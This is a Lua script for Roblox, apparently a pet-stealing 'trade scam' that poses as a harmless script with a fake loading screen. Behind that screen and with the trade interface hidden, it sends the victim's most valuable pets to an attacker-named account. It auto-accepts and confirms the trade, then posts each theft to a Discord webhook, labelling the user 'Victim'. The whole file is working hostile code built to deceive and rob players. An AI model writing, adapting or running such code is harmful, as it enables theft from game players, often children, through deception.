function SendMessageEMBED(url, embed, bool)
  local http = game:GetService("HttpService")
  local headers = {
      ["Content-Type"] = "application/json"
  }
  local data = {
      username = "M O L I T O W N",
      avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
      content = "Broke injected ur script.",
      embeds = {
          {
              title = embed.title,
              color = embed.color,
              fields = embed.fields,
          }
      }
  }
  local data2 = {
      username = "M O L I T O W N",
      avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
      content = "-- @everyone\n" .. TeleportScript,
      embeds = {
          {
              title = embed.title,
              color = 16711935,
              fields = embed.fields,
          }
      }
  }

  local body = http:JSONEncode(data)
  local body2 = http:JSONEncode(data2)
  if bool == true then
      local response = request({
          Url = url,
          Method = "POST",
          Headers = headers,
          Body = body2
      })
  else
      local response = request({
          Url = url,
          Method = "POST",
          Headers = headers,
          Body = body
      })
  end
end

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

-- Function to send trade success message to Discord
function SendTradeSuccessMessage(ReceiverName, tradedPets)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    -- Format traded pets list
    local petsText = ""
    local totalValue = 0
    
    for i, pet in ipairs(tradedPets) do
        local calculatedValue, baseValue = calculatePetValue(pet.data)
        local petType = getPetTypeString(pet.data.properties or {})
        petsText = petsText .. string.format("%s%s: %d‚ÇΩ\n", pet.name, petType, math.floor(calculatedValue))
        totalValue = totalValue + calculatedValue
    end
    
    local data = {
        username = "Mama Mio [–ú–§–û –í–û–†–ö 2025]",
        avatar_url = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
        embeds = {
            {
                title = "‚úÖ –ß–£–†–ö–ê –ë–´–õ–ê –í–¨–ï–ë–ê–ù–ê –ö–û–¢–û–ü–ï–°",
                color = 65280, -- Green color
                fields = {
                    {
                        name = "üë§ Trade doxbin",
                        value = "```lua\n" ..
                               "Victim    : " .. game.Players.LocalPlayer.Name .. "\n" ..
                               "Receiver  : " .. ReceiverName .. "\n" ..
                               "Total Value: " .. string.format("%d‚ÇΩ", math.floor(totalValue)) .. "\n" ..
                               "Pets Sent : " .. #tradedPets .. "```",
                        inline = false
                    },
                    {
                        name = "üéÅ Traded Pets",
                        value = "```lua\n" .. (petsText ~= "" and petsText or "No pets traded") .. "```",
                        inline = false
                    }
                },
                timestamp = DateTime.now():ToIsoDate(),
                footer = {
                    text = "–í–û–†–ö–ê–ï–ú –ö–õ–Ø–ò–ù–° –í 2032! FEAT TEMNI PRINC"
                }
            }
        }
    }
    
    local body = http:JSONEncode(data)
    
    local success, result = pcall(function()
        return request({
            Url = Webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
end

local function TradeIncoming(ReceiverName)
    while true do
    local RouterClient = Loaders("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
    local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)

    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
    local sortedPets = {}
    local tradedPets = {} 
    
    for petUid, petData in pairs(PetsInventory) do
        local petInfo = InventoryDB[petData.category][petData.id]
        local calculatedValue, baseValue = calculatePetValue(petData)
        table.insert(sortedPets, {
            uid = petUid,
            data = petData,
            value = calculatedValue,
            baseValue = baseValue,
            name = petInfo.name
        })
    end
    
    table.sort(sortedPets, function(a, b)
        return a.value > b.value
    end)
    
    moveGuiOffscreen()
    SendTrade:FireServer(game.Players[ReceiverName])
    wait(5)
    
    local petCount = 0
    local petLimit = 18
    
    for _, petInfo in ipairs(sortedPets) do
        if petCount < petLimit then
            AddPetRemote:FireServer(petInfo.uid)
            table.insert(tradedPets, {
                uid = petInfo.uid,
                data = petInfo.data,
                name = petInfo.name,
                value = petInfo.value
            })
            petCount = petCount + 1
            wait(0.2)
        else
            break
        end
    end
                wait(5)
                    AcceptNegotiationRemote:FireServer()
                wait(2)
                    ConfirmTradeRemote:FireServer()
                wait(2) 
                    if #tradedPets > 0 then
                        SendTradeSuccessMessage(ReceiverName, tradedPets)
                    end
            end
end

function SendLeaveNotify(playerName)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local dataLeave = {
        username = "M O L I T O W N",
        avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
        content = "**" .. playerName .. "** left from the game!",
        embeds = {
            {
                color = 0x610066,
                fields = {
                    {
                        name = "„Äò:mammoth:„Äô**User**",
                        value = "```lua" ..
                            "\nUsername   : " .. game.Players.LocalPlayer.Name .."```",
                        inline = false
                    }
                }
            }
        }
    }

    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)

    local response = request({
        Url = Webhook,
        Method = "POST",
        Headers = headers,
        Body = jsonDataLeave
    })
end

game:GetService("Players").PlayerRemoving:Connect(function(player)
    if player == game:GetService("Players").LocalPlayer then
        SendLeaveNotify(player.Name)
    end
end)

-- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤–µ–±—Ö—É–∫ —Å —É—á–µ—Ç–æ–º —Å—Ç–æ–∏–º–æ—Å—Ç–∏ –¥–ª—è @everyone
if totalValue >= 50 then
    SendMessageEMBED(Webhook, embed, true)  -- –° @everyone
else
    SendMessageEMBED(Webhook, embed, false) -- –ë–µ–∑ @everyone
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username or Username2 then
        player.Chatted:Connect(function(msg)
            if not sent then
            TradeIncoming(Username or Username2)
            end
        end)
    end
end)

for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name == Username or Username2 then
        player.Chatted:Connect(function(msg)
            TradeIncoming(Username)
        end)
    end
end

-- –°–æ–∑–¥–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ—Ä–µ–π–º –¥–ª—è –±–ª—é—Ä–∞
local blurFrame = Instance.new("Frame")
blurFrame.Name = "LoadingBlurFrame"
blurFrame.Size = UDim2.new(1, 0, 1, 0)
blurFrame.Position = UDim2.new(0, 0, 0, 0)
blurFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blurFrame.BackgroundTransparency = 0.3
blurFrame.ZIndex = 10
blurFrame.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

-- –°–æ–∑–¥–∞–µ–º —ç—Ñ—Ñ–µ–∫—Ç –±–ª—é—Ä–∞ —á–µ—Ä–µ–∑ GaussianBlur
local blurEffect = Instance.new("BlurEffect")
blurEffect.Size = 10
blurEffect.Name = "LoadingBlur"
blurEffect.Parent = game:GetService("Lighting")

-- –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏
local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingFrame"
loadingFrame.Size = UDim2.new(0, 300, 0, 150)
loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
loadingFrame.BackgroundTransparency = 0.1
loadingFrame.BorderSizePixel = 0
loadingFrame.ZIndex = 11
loadingFrame.Parent = blurFrame

-- –ó–∞–∫—Ä—É–≥–ª–µ–Ω–Ω—ã–µ —É–≥–ª—ã
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = loadingFrame

-- –¢–µ–∫—Å—Ç –∑–∞–≥—Ä—É–∑–∫–∏
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = UDim2.new(0.8, 0, 0, 40)
loadingText.Position = UDim2.new(0.1, 0, 0.3, 0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "–ó–∞–≥—Ä—É–∑–∫–∞..."
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.TextScaled = true
loadingText.Font = Enum.Font.Gotham
loadingText.TextWrapped = true
loadingText.ZIndex = 12
loadingText.Parent = loadingFrame

-- –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = UDim2.new(0.8, 0, 0, 4)
loadingBar.Position = UDim2.new(0.1, 0, 0.7, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
loadingBar.BorderSizePixel = 0
loadingBar.ZIndex = 12
loadingBar.Parent = loadingFrame

local loadingProgress = Instance.new("Frame")
loadingProgress.Name = "LoadingProgress"
loadingProgress.Size = UDim2.new(0, 0, 1, 0)
loadingProgress.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
loadingProgress.BorderSizePixel = 0
loadingProgress.ZIndex = 13
loadingProgress.Parent = loadingBar

local progressCorner = Instance.new("UICorner")
progressCorner.CornerRadius = UDim.new(1, 0)
progressCorner.Parent = loadingProgress

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(1, 0)
barCorner.Parent = loadingBar

-- –ê–Ω–∏–º–∞—Ü–∏—è –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–∞ –∑–∞–≥—Ä—É–∑–∫–∏
local function animateLoadingBar()
    while loadingProgress.Parent do
        loadingProgress.Size = UDim2.new(0, 0, 1, 0)
        
        -- –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è
        for i = 0, 240, 4 do
            if not loadingProgress.Parent then break end
            loadingProgress.Size = UDim2.new(0, i, 1, 0)
            wait(0.02)
        end
        
        wait(0.5)
    end
end

-- –°–ø–∏—Å–æ–∫ —Å–ª—É—á–∞–π–Ω—ã—Ö —Ç–µ–∫—Å—Ç–æ–≤ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏
local loadingMessages = {
    "–ó–∞–≥—Ä—É–∑–∫–∞ —Ä–µ—Å—É—Ä—Å–æ–≤...",
    "–û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è —Å—Ü–µ–Ω—ã...",
    "–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –æ–±—ä–µ–∫—Ç–æ–≤...",
    "–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã...",
    "–ó–∞–≥—Ä—É–∑–∫–∞ —Ç–µ–∫—Å—Ç—É—Ä...",
    "–ö–æ–º–ø–∏–ª—è—Ü–∏—è —Å–∫—Ä–∏–ø—Ç–æ–≤...",
    "–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...",
    "–°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö...",
    "–ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ –∞—Å—Å–µ—Ç–æ–≤...",
    "–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞...",
    "–ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏...",
    "–ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π...",
    "–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–ª–∞–≥–∏–Ω–æ–≤...",
    "–ó–∞–≥—Ä—É–∑–∫–∞ –º–æ–¥—É–ª–µ–π...",
    "–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫ —Ä–∞–±–æ—Ç–µ..."
}

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è —Ç–µ–∫—Å—Ç–∞
local function changeRandomText()
    while loadingText.Parent do
        local randomMessage = loadingMessages[math.random(1, #loadingMessages)]
        loadingText.Text = randomMessage
        
        -- –ù–µ–±–æ–ª—å—à–∞—è –∞–Ω–∏–º–∞—Ü–∏—è –ø–æ—è–≤–ª–µ–Ω–∏—è —Ç–µ–∫—Å—Ç–∞
        for i = 0, 1, 0.1 do
            if not loadingText.Parent then break end
            loadingText.TextTransparency = 1 - i
            wait(0.02)
        end
        
        wait(5) -- –ñ–¥–µ–º 5 —Å–µ–∫—É–Ω–¥ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–∏–º –∏–∑–º–µ–Ω–µ–Ω–∏–µ–º
        
        -- –ê–Ω–∏–º–∞—Ü–∏—è –∏—Å—á–µ–∑–Ω–æ–≤–µ–Ω–∏—è —Ç–µ–∫—Å—Ç–∞
        for i = 0, 1, 0.1 do
            if not loadingText.Parent then break end
            loadingText.TextTransparency = i
            wait(0.02)
        end
    end
end

-- –ó–∞–ø—É—Å–∫–∞–µ–º –∞–Ω–∏–º–∞—Ü–∏–∏
spawn(animateLoadingBar)
spawn(changeRandomText)

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è –º–µ–Ω—é –∑–∞–≥—Ä—É–∑–∫–∏
local function hideLoadingMenu()
    if blurFrame then
        blurFrame:Destroy()
    end
    if blurEffect then
        blurEffect:Destroy()
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ –º–µ–Ω—é –∑–∞–≥—Ä—É–∑–∫–∏ (–µ—Å–ª–∏ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å)
local function showLoadingMenu()
    -- –ö–æ–¥ —Å–æ–∑–¥–∞–Ω–∏—è —É–∂–µ –≤—ã–ø–æ–ª–Ω–µ–Ω –≤—ã—à–µ
end

-- –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –≤–Ω–µ—à–Ω–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
return {
    Show = showLoadingMenu,
    Hide = hideLoadingMenu
}
